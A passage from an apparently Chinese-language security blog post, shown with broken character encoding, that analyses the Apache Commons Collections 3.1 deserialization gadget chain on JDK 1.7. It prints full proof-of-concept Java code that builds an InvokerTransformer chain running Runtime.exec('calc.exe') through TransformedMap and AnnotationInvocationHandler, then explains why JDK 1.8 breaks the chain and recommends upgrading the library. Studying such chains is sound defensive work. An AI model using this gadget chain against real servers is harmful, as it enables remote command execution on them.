//2.æœå‹™ç«¯è®€å–æ–‡ä»¶ï¼Œååºåˆ—åŒ–ï¼Œæ¨¡æ“¬ç¶²çµ¡å‚³è¼¸FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //æœå‹™ç«¯ååºåˆ—åŒ–æˆChainedTransformeræ ¼å¼ï¼Œå†èª¿ç”¨transformå‡½æ•¸Transformer transformerChain_now = (ChainedTransformer) fin.readObject;transformerChain_now.transform(null);}}</p><div class=pgc-img><img alt="JAVAååºåˆ—åŒ– - commons-collections - 1" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/24822ba4d14747858166a8c065c96838><p class=pgc-img-caption></p></div><p>å®Œæˆå‘½ä»¤åŸ·è¡Œæœå‹™ç«¯åŸ·è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><ol start=1><li>æœå‹™ç«¯ååºåˆ—åŒ–æˆ‘å€‘çš„è¼¸å…¥æˆChainedTransformeré¡å‹</li><li>èª¿ç”¨é€™å€‹è¼¸å…¥çš„transformå‡½æ•¸</li></ol><p>è½‰è®Šçš„é¡å‹æ˜¯ä¸€å€‹æ•¸æ“šè½‰åŒ–éˆæ•¸æ“šæ ¼å¼ï¼Œå¾ˆæ˜é¡¯æœå‹™ç«¯ä¸å¯èƒ½å­˜åœ¨é€™ç¨®ä»£ç¢¼ï¼Œåˆ©ç”¨åƒ¹å€¼ä¸è¶³ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘éœ€è¦ç¹¼çºŒå»¶é•·é€™å€‹æ¼æ´éˆã€‚</p><p><strong>å°è£æˆMap</strong></p><p>ç”±æ–¼æˆ‘å€‘å¾—åˆ°çš„æ˜¯ChainedTransformerï¼Œä¸€å€‹è½‰æ›éˆï¼ŒTransformedMapé¡æä¾›å°‡mapå’Œè½‰æ›éˆç¶å®šçš„æ§‹é€ å‡½æ•¸ï¼Œåªéœ€è¦æ·»åŠ æ•¸æ“šè‡³mapä¸­å°±æœƒè‡ªå‹•èª¿ç”¨é€™å€‹è½‰æ›éˆåŸ·è¡Œpayloadã€‚</p><p>é€™æ¨£æˆ‘å€‘å°±å¯ä»¥æŠŠè§¸ç™¼æ¢ä»¶å¾é¡¯æ€§çš„èª¿ç”¨è½‰æ›éˆçš„transformå‡½æ•¸å»¶ä¼¸åˆ°ä¿®æ”¹mapçš„å€¼ã€‚å¾ˆæ˜é¡¯å¾Œè€…æ˜¯ä¸€å€‹å¸¸è¦æ“ä½œï¼Œæ¥µæœ‰å¯èƒ½è¢«è§¸ç™¼ã€‚</p><p>TransformedMap</p><p>public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer);}</p><p>tryä¸€ä¸‹ï¼š</p><p>public static void main(String args) throws Exception { //1.å®¢æˆ¶ç«¯æ§‹å»ºæ”»æ“Šä»£ç¢¼//æ­¤è™•æ§‹å»ºäº†ä¸€å€‹transformersçš„æ•¸çµ„ï¼Œåœ¨å…¶ä¸­æ§‹å»ºäº†ä»»æ„å‡½æ•¸åŸ·è¡Œçš„æ ¸å¿ƒä»£ç¢¼Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})}; //å°‡transformersæ•¸çµ„å­˜å…¥ChaniedTransformeré€™å€‹ç¹¼æ‰¿é¡Transformer transformerChain = new ChainedTransformer(transformers); //å‰µå»ºMapä¸¦ç¶å®štransformerChinaMap innerMap = new HashMap;innerMap.put("value", "value"); //çµ¦äºˆmapæ•¸æ“šè½‰åŒ–éˆMap outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //payloadåºåˆ—åŒ–å¯«å…¥æ–‡ä»¶ï¼Œæ¨¡æ“¬ç¶²çµ¡å‚³è¼¸FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(outerMap); //2.æœå‹™ç«¯æ¥å—ååºåˆ—åŒ–ï¼Œå‡ºç™¼æ¼æ´//è®€å–æ–‡ä»¶ï¼Œååºåˆ—åŒ–ï¼Œæ¨¡æ“¬ç¶²çµ¡å‚³è¼¸FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //æœå‹™ç«¯ååºåˆ—åŒ–æˆMapæ ¼å¼ï¼Œå†èª¿ç”¨transformå‡½æ•¸Map outerMap_now = (Map)fin.readObject; //2.1å¯ä»¥ç›´æ¥mapæ·»åŠ æ–°å€¼ï¼Œè§¸ç™¼æ¼æ´//outerMap_now.put("123", "123");//2.2ä¹Ÿå¯ä»¥ç²å–mapéµå€¼å°ï¼Œä¿®æ”¹valueï¼Œvalueç‚ºvalueï¼Œfoobar,è§¸ç™¼æ¼æ´Map.Entry onlyElement = (Map.Entry) outerMap.entrySet.iterator.next;onlyElement.setValue("foobar");}</p><p>è¦ªæ¸¬æœ‰æ•ˆ</p><p><strong>ç¬¬å››æ­¥ jdk1.7 AnnotationInvocationHandlerçš„readObjectè¤‡å¯«é»</strong></p><p>ä¸Šé¢çš„æ¼æ´è§¸ç™¼æ¢ä»¶ä»ç„¶ä¸å¤ å®Œç¾ï¼Œéœ€è¦æœå‹™ç«¯æŠŠæˆ‘å€‘å‚³å…¥çš„åºåˆ—åŒ–å…§å®¹ååºåˆ—åŒ–ç‚ºmapï¼Œä¸¦å°å€¼é€²è¡Œä¿®æ”¹ã€‚ä¹‹å‰ä¹Ÿèªªéå®Œç¾çš„ååºåˆ—åŒ–æ¼æ´é‚„éœ€è¦ä¸€å€‹readobjectè¤‡å¯«é»ï¼Œä½¿åªè¦æœå‹™ç«¯åŸ·è¡Œäº†readObjectå‡½æ•¸å°±ç­‰æ–¼å‘½ä»¤åŸ·è¡Œã€‚</p><p>åœ¨jdk1.7ä¸­å°±å­˜åœ¨ä¸€å€‹å®Œç¾çš„readobjectè¤‡å¯«é»çš„é¡sun.reflect.annotation.AnnotationInvocationHandlerã€‚æˆ‘å€‘å…ˆçœ‹ä»–çš„æ§‹é€ å‡½æ•¸</p><p>AnnotationInvocationHandler(Class&lt;? extends Annotation> var1, Map&lt;String, Object> var2) {Class var3 = var1.getInterfaces; if (var1.isAnnotation && var3.length == 1 && var3[0] == Annotation.class) {//var1æ»¿è¶³é€™å€‹ifæ¢ä»¶æ™‚this.type = var1;//å‚³å…¥çš„var1åˆ°this.typethis.memberValues = var2;//æˆ‘å€‘çš„mapå‚³å…¥this.memberValues} else { throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");}}</p><p>readobjectè¤‡å¯«å‡½æ•¸ï¼š</p><p>private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { //é»˜èªååºåˆ—åŒ–var1.defaultReadObject;AnnotationType var2 = null; try {var2 = AnnotationType.getInstance(this.type);} catch (IllegalArgumentException var9) { throw new InvalidObjectException("Non-annotation type in annotation serial stream");}Map var3 = var2.memberTypes;//Iterator var4 = this.memberValues.entrySet.iterator;//ç²å–æˆ‘å€‘æ§‹é€ mapçš„è¿­ä»£å™¨while(var4.hasNext) {Entry var5 = (Entry)var4.next;//éæ­·mapè¿­ä»£å™¨String var6 = (String)var5.getKey;//ç²å–keyçš„åç¨±Class var7 = (Class)var3.get(var6);//ç²å–var2ä¸­ç›¸æ‡‰keyçš„classé¡ï¼Ÿé€™é‚Šå…·é«”var3æ˜¯ä»€éº¼å€‹å«ç¾©ä¸å¤ªæ‡‚ï¼Œä½†æ˜¯è‚¯å®švar7ã€8å…©è€…ä¸ä¸€æ¨£if (var7 != null) {Object var8 = var5.getValue;//ç²å–mapçš„valueif (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) { //å…©è€…é¡å‹ä¸ä¸€è‡´ï¼Œçµ¦var5è³¦å€¼ï¼ï¼å…·é«”è³¦å€¼ä»€éº¼å·²ç¶“ä¸é—œéµäº†ï¼åªè¦è³¦å€¼äº†å°±ä»£è¡¨åŸ·è¡Œå‘½ä»¤æˆåŠŸvar5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass + "[" + var8 + "]")).setMember((Method)var2.members.get(var6)));}}}}}</p><p>é›–ç„¶ç›¸å°æ–¼é€™å€‹é¡å…·é«”åšä»€éº¼ï¼Œå¯¦åœ¨æ˜¯æ²’æœ‰ç²¾åŠ›å»ææ¸…æ¥šäº†ï¼Œä½†æ˜¯å®ƒæœ€çµ‚å°æ–¼æˆ‘å€‘å‚³å…¥æ§‹é€ å‡½æ•¸çš„mapé€²è¡Œéæ­·è³¦å€¼ã€‚é€™æ¨£å°±å½Œè£œäº†æˆ‘å€‘ä¹‹å‰ååºåˆ—åŒ–éœ€è¦æœå‹™ç«¯å­˜åœ¨ä¸€äº›æ¢ä»¶çš„ä¸è¶³ï¼Œå½¢æˆå®Œç¾ååºåˆ—åŒ–æ”»æ“Šã€‚</p><p>æœ€çµ‚æ¨¡æ“¬æ”»æ“Šä»£ç¢¼</p><p>public static void main(String args) throws Exception { //1.å®¢æˆ¶ç«¯æ§‹å»ºæ”»æ“Šä»£ç¢¼//æ­¤è™•æ§‹å»ºäº†ä¸€å€‹transformersçš„æ•¸çµ„ï¼Œåœ¨å…¶ä¸­æ§‹å»ºäº†ä»»æ„å‡½æ•¸åŸ·è¡Œçš„æ ¸å¿ƒä»£ç¢¼Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})}; //å°‡transformersæ•¸çµ„å­˜å…¥ChaniedTransformeré€™å€‹ç¹¼æ‰¿é¡Transformer transformerChain = new ChainedTransformer(transformers); //å‰µå»ºMapä¸¦ç¶å®štransformerChinaMap innerMap = new HashMap;innerMap.put("value", "value"); //çµ¦äºˆmapæ•¸æ“šè½‰åŒ–éˆMap outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //åå°„æ©Ÿåˆ¶èª¿ç”¨AnnotationInvocationHandleré¡çš„æ§‹é€ å‡½æ•¸Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); //å–æ¶ˆæ§‹é€ å‡½æ•¸ä¿®é£¾ç¬¦é™åˆ¶ctor.setAccessible(true); //ç²å–AnnotationInvocationHandleré¡å¯¦ä¾‹Object instance = ctor.newInstance(Target.class, outerMap); //payloadåºåˆ—åŒ–å¯«å…¥æ–‡ä»¶ï¼Œæ¨¡æ“¬ç¶²çµ¡å‚³è¼¸FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(instance); //2.æœå‹™ç«¯è®€å–æ–‡ä»¶ï¼Œååºåˆ—åŒ–ï¼Œæ¨¡æ“¬ç¶²çµ¡å‚³è¼¸FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //æœå‹™ç«¯ååºåˆ—åŒ–fin.readObject;}</p><p>æˆåŠŸ</p><div class=pgc-img><img alt="JAVAååºåˆ—åŒ– - commons-collections - 1" onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/a4c79ee037ac4359b1d974630c0e5bb0><p class=pgc-img-caption></p></div><p>è‡³æ­¤ï¼Œæˆ‘å€‘åœ¨å®¢æˆ¶ç«¯æ§‹é€ äº†payloadç™¼é€è‡³æœå‹™ç«¯ï¼Œåªè¦æœå‹™ç«¯</p><ol start=1><li>å°æˆ‘å€‘çš„è¼¸å…¥é€²è¡Œååºåˆ—åŒ–</li><li>jdkç‰ˆæœ¬ç‚º1.7</li></ol><p>å°±å¯ä»¥ç›´æ¥å®Œæˆå‘½ä»¤åŸ·è¡Œï¼Œå®Œç¾ï¼</p><p><strong>jdk1.8ç‚ºä»€éº¼ä¸è¡Œå‘¢</strong></p><p>é‚£éº¼jdk1.8ç‚ºå•¥ä¸è¡Œå‘¢,çœ‹ä¸€ä¸‹jdk8è£¡é¢çš„sun.reflect.annotation.AnnotationInvocationHandler readObjectè¤‡å¯«é»ï¼š</p><p>private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {GetField var2 = var1.readFields;Class var3 = (Class)var2.get("type", (Object)null);Map var4 = (Map)var2.get("memberValues", (Object)null);AnnotationType var5 = null; try {var5 = AnnotationType.getInstance(var3);} catch (IllegalArgumentException var13) { throw new InvalidObjectException("Non-annotation type in annotation serial stream");}Map var6 = var5.memberTypes;LinkedHashMap var7 = new LinkedHashMap;String var10;Object var11; for(Iterator var8 = var4.entrySet.iterator; var8.hasNext; var7.put(var10, var11)) {Entry var9 = (Entry)var8.next;var10 = (String)var9.getKey;var11 = null;Class var12 = (Class)var6.get(var10); if (var12 != null) {var11 = var9.getValue; if (!var12.isInstance(var11) && !(var11 instanceof ExceptionProxy)) { //å¾ˆå‚·å¿ƒçš„ï¼Œæ²’æœ‰äº†mapè³¦å€¼èªå¥var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass + "[" + var11 + "]")).setMember((Method)var5.members.get(var10));}}}</p><p>å› ç‚ºé€™å€‹å‡½æ•¸å‡ºç¾äº†è®Šå‹•ï¼Œä¸å†æœ‰è³¦å€¼èªå¥ï¼Œæ‰€ä»¥è§¸ç™¼ä¸äº†æ¼æ´ã€‚</p><p><strong>No.6å¯«åœ¨å¾Œé¢</strong></p><p>è‡³æ­¤æˆ‘å€‘å°±å®Œæˆcommon-collection 3.1ç‰ˆæœ¬ jdk1.7ç‰ˆæœ¬ä¸‹çš„POCå¾©ç¾å’Œåˆ©ç”¨éˆåˆ†æã€‚ç•¶ç„¶é‚„æœ‰common-collection ä¸åŒçµ„ä»¶ç‰ˆæœ¬ï¼Œä¸åŒç’°å¢ƒä¸‹pocå’Œåˆ©ç”¨éˆå‡æœ‰ä¸åŒï¼Œåœ¨ysoserialä¸‹å°±æœ‰7ï¼Œ8ä¸­åˆ©ç”¨æ–¹å¼ã€‚é‚„å¯ä»¥é€šérmiæ¨¡å¼é€²è¡Œåˆ©ç”¨ç­‰ã€‚</p><p>ä½†æ˜¯ç”±æ–¼é€™ç¯‡åšå®¢å¯«çš„å¤ªé•·äº†ï¼Œæ€è·¯ä¹Ÿä¸€ç›´æ–·æ–·çºŒçºŒï¼Œå…¶ä»–å…§å®¹ä¹‹å¾Œå†é™¸çºŒå­¸ç¿’åˆ†æå§~</p><p><strong>No.7ä¿®å¾©æ„è¦‹</strong></p><p>commons-collectionsçµ„ä»¶ç‰ˆæœ¬ å‡ç´šè‡³å®˜æ–¹æœ€æ–°ç‰ˆæœ¬</p></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>åºåˆ—åŒ–</a></li><li><a>JAVA</a></li><li><a>commons</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=æœç´¢>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>ğŸ”</button></form></section><section class=widget><h3 class=widget-title>æœ€æ–°æ–‡ç«  âš¡</h3><ul class=widget-list><li><a href=../../tw/%E7%A7%91%E6%8A%80/a90a489a.html alt=JAVAä¸­å¤šæ…‹çš„æ¦‚å¿µå’Œæ‡‰ç”¨ï¼Œé€šéæ¡ˆä¾‹åˆ†ææˆå“¡è®Šé‡ã€æ–¹æ³•çš„è¨ªå•ç‰¹é» class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/15310942260931dda577a75 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/a90a489a.html title=JAVAä¸­å¤šæ…‹çš„æ¦‚å¿µå’Œæ‡‰ç”¨ï¼Œé€šéæ¡ˆä¾‹åˆ†ææˆå“¡è®Šé‡ã€æ–¹æ³•çš„è¨ªå•ç‰¹é»>JAVAä¸­å¤šæ…‹çš„æ¦‚å¿µå’Œæ‡‰ç”¨ï¼Œé€šéæ¡ˆä¾‹åˆ†ææˆå“¡è®Šé‡ã€æ–¹æ³•çš„è¨ªå•ç‰¹é»</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/9cfcdd6f.html alt=ã€ŠJAVAç·¨ç¨‹æ€æƒ³ã€‹5åˆ†é˜é€Ÿæˆï¼šç¬¬8ç« ï¼ˆå¤šæ…‹ï¼‰ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/399a29d93fde48fca4bae44dffbced07 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/9cfcdd6f.html title=ã€ŠJAVAç·¨ç¨‹æ€æƒ³ã€‹5åˆ†é˜é€Ÿæˆï¼šç¬¬8ç« ï¼ˆå¤šæ…‹ï¼‰>ã€ŠJAVAç·¨ç¨‹æ€æƒ³ã€‹5åˆ†é˜é€Ÿæˆï¼šç¬¬8ç« ï¼ˆå¤šæ…‹ï¼‰</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/6f585f1e.html alt=JAVAå…¥é–€åˆ°å¤§ç¥ï¼ˆç©è½‰æ­£å‰‡è¡¨é”å¼ï¼‰ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/6f585f1e.html title=JAVAå…¥é–€åˆ°å¤§ç¥ï¼ˆç©è½‰æ­£å‰‡è¡¨é”å¼ï¼‰>JAVAå…¥é–€åˆ°å¤§ç¥ï¼ˆç©è½‰æ­£å‰‡è¡¨é”å¼ï¼‰</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/8a3d9e7a.html alt=ã€ŒJAVAã€å¾æ ¼å¼åŒ–è¼¸å‡ºåˆ°æƒæè¼¸å…¥ï¼Œæ·±ç©¶Javaæ­£å‰‡è¡¨é”å¼åŒ¹é…ä¹‹é“ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/dfic-imagehandler/ea11259e-5098-451f-b989-4e3169a16a1c style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/8a3d9e7a.html title=ã€ŒJAVAã€å¾æ ¼å¼åŒ–è¼¸å‡ºåˆ°æƒæè¼¸å…¥ï¼Œæ·±ç©¶Javaæ­£å‰‡è¡¨é”å¼åŒ¹é…ä¹‹é“>ã€ŒJAVAã€å¾æ ¼å¼åŒ–è¼¸å‡ºåˆ°æƒæè¼¸å…¥ï¼Œæ·±ç©¶Javaæ­£å‰‡è¡¨é”å¼åŒ¹é…ä¹‹é“</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/e2ad303f.html alt=çµ¦JAVAé–‹ç™¼äººå“¡çš„æ­£å‰‡è¡¨é”å¼å…¥é–€èª² class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p9.pstatp.com/large/pgc-image/5d620d422d0a4855924c5bcbf8ba483a style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/e2ad303f.html title=çµ¦JAVAé–‹ç™¼äººå“¡çš„æ­£å‰‡è¡¨é”å¼å…¥é–€èª²>çµ¦JAVAé–‹ç™¼äººå“¡çš„æ­£å‰‡è¡¨é”å¼å…¥é–€èª²</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/fd0a9e51.html alt=JAVAæ€éº¼è™•ç†ç•°å¸¸ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p9.pstatp.com/large/dfic-imagehandler/6cf507ab-d41c-4bb0-bef0-6def0eb1fef8 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/fd0a9e51.html title=JAVAæ€éº¼è™•ç†ç•°å¸¸>JAVAæ€éº¼è™•ç†ç•°å¸¸</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/d3bb906c.html alt=ä¸€æ–‡å¸¶ä½ çœ‹æ‡‚äºŒå‰æ¨¹çš„åºåˆ—åŒ– class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/da5436c407ec4fc68dfb02f6948e3ba9 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/d3bb906c.html title=ä¸€æ–‡å¸¶ä½ çœ‹æ‡‚äºŒå‰æ¨¹çš„åºåˆ—åŒ–>ä¸€æ–‡å¸¶ä½ çœ‹æ‡‚äºŒå‰æ¨¹çš„åºåˆ—åŒ–</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/3906fa80.html alt=JAVAæ‡‰ç”¨ç¨‹åºé–‹ç™¼ä¹‹é›†åˆé¡ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/aa9e1fe1752a4a1886a691485e0e1373 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/3906fa80.html title=JAVAæ‡‰ç”¨ç¨‹åºé–‹ç™¼ä¹‹é›†åˆé¡>JAVAæ‡‰ç”¨ç¨‹åºé–‹ç™¼ä¹‹é›†åˆé¡</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/c4f080cc.html alt=å°ç™½å­¸JAVAä¹‹â€”â€”Listæ¥å£çš„å¯¦ç¾é¡â€”â€”ArrayList class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/b14b6a69b8354d53a35156eaa365395e style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/c4f080cc.html title=å°ç™½å­¸JAVAä¹‹â€”â€”Listæ¥å£çš„å¯¦ç¾é¡â€”â€”ArrayList>å°ç™½å­¸JAVAä¹‹â€”â€”Listæ¥å£çš„å¯¦ç¾é¡â€”â€”ArrayList</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/67f00d06.html alt=å­¸ç¿’å»–é›ªå³°çš„JAVAæ•™ç¨‹---ç•°å¸¸è™•ç†ï¼ˆä½¿ç”¨æ–·è¨€ï¼‰ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/67f00d06.html title=å­¸ç¿’å»–é›ªå³°çš„JAVAæ•™ç¨‹---ç•°å¸¸è™•ç†ï¼ˆä½¿ç”¨æ–·è¨€ï¼‰>å­¸ç¿’å»–é›ªå³°çš„JAVAæ•™ç¨‹---ç•°å¸¸è™•ç†ï¼ˆä½¿ç”¨æ–·è¨€ï¼‰</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/866b06ba.html alt=å‰µå»ºä¸€å€‹æ“´å±•åç‚ºnbçš„åœ–ç‰‡ï¼Œæ·ºè«‡Pythonçš„æ–‡ä»¶ç®¡ç†å’Œåºåˆ—åŒ–æ“ä½œ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/dfic-imagehandler/3b8cb777-6c9f-4d02-9412-9d4e26488710 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/866b06ba.html title=å‰µå»ºä¸€å€‹æ“´å±•åç‚ºnbçš„åœ–ç‰‡ï¼Œæ·ºè«‡Pythonçš„æ–‡ä»¶ç®¡ç†å’Œåºåˆ—åŒ–æ“ä½œ>å‰µå»ºä¸€å€‹æ“´å±•åç‚ºnbçš„åœ–ç‰‡ï¼Œæ·ºè«‡Pythonçš„æ–‡ä»¶ç®¡ç†å’Œåºåˆ—åŒ–æ“ä½œ</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/f08377c0.html alt=æ…•èª²èªç‚ºJAVAæ¶æ§‹å¸«æ‡‰è©²å…·å‚™çš„10å¤§èƒ½åŠ›ï¼Œä½ æœƒå¤šå°‘ï¼Ÿ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/7414bd0cbfe848a98777302c4730c09e style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/f08377c0.html title=æ…•èª²èªç‚ºJAVAæ¶æ§‹å¸«æ‡‰è©²å…·å‚™çš„10å¤§èƒ½åŠ›ï¼Œä½ æœƒå¤šå°‘ï¼Ÿ>æ…•èª²èªç‚ºJAVAæ¶æ§‹å¸«æ‡‰è©²å…·å‚™çš„10å¤§èƒ½åŠ›ï¼Œä½ æœƒå¤šå°‘ï¼Ÿ</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/37154d9a.html alt=å¯«äº†10å¹´JAVAä»£ç¢¼ï¼Œç‚ºä½•é‚„æ˜¯çµ¦äººä¸€ç¨®äº‚ç³Ÿç³Ÿçš„æ„Ÿè¦ºï¼Ÿ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p9.pstatp.com/large/dfic-imagehandler/eadb4752-5f6b-4a85-ac99-5c6fae2b5bbc style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/37154d9a.html title=å¯«äº†10å¹´JAVAä»£ç¢¼ï¼Œç‚ºä½•é‚„æ˜¯çµ¦äººä¸€ç¨®äº‚ç³Ÿç³Ÿçš„æ„Ÿè¦ºï¼Ÿ>å¯«äº†10å¹´JAVAä»£ç¢¼ï¼Œç‚ºä½•é‚„æ˜¯çµ¦äººä¸€ç¨®äº‚ç³Ÿç³Ÿçš„æ„Ÿè¦ºï¼Ÿ</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/32ee6540.html alt=JAVAä¸ŠåŠ å¯†ç®—æ³•çš„å¯¦ç¾ç”¨ä¾‹ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/6aa97b7dfebc473ebb4ea11cc67c6614 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/32ee6540.html title=JAVAä¸ŠåŠ å¯†ç®—æ³•çš„å¯¦ç¾ç”¨ä¾‹>JAVAä¸ŠåŠ å¯†ç®—æ³•çš„å¯¦ç¾ç”¨ä¾‹</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/e4f66bb9.html alt="ç®—æ³•ï¼šå­—ç¬¦ä¸²ç›¸åŠ   ï¼ˆJAVAï¼‰" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/e989f66b713445ec8371accf7f23ce2f style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/e4f66bb9.html title="ç®—æ³•ï¼šå­—ç¬¦ä¸²ç›¸åŠ   ï¼ˆJAVAï¼‰">ç®—æ³•ï¼šå­—ç¬¦ä¸²ç›¸åŠ  ï¼ˆJAVAï¼‰</a></li><hr></ul></section><section class=widget><h3 class=widget-title>å…¶ä»–</h3><ul class=widget-list><li><a href=TOS.html>ä½¿ç”¨æ¢æ¬¾</a></li><li><a href=CommentPolicy.html>ç•™è¨€æ”¿ç­–</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>è¯çµ¡æˆ‘å€‘</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>æå®¢å¿«è¨Š</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>